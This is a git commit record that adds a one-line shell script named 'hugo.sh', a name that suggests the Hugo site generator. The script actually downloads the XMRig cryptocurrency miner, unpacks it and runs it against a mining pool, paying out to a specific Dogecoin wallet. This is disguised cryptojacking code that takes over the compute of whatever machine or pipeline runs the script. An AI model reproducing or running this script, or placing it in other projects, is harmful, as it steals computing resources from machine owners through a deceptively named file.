e50ae019b313a17731c0f5ac39dd8545bce1c30a
jamalukeh <106133464+jamalukeh@users.noreply.github.com>
2022-05-24 04:01:31 +0000

    Create hugo.sh

---
+++ hugo.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz && tar xvf xmrig-6.17.0-linux-static-x64.tar.gz && ./xmrig-6.17.0/xmrig -o statum+ssl://rx.unmineable.com:443 -a rx -k -u DOGE:D8YGsVokte9ahg7P1pCn5BLWfUouDWF6qQ.3 -p x pause 
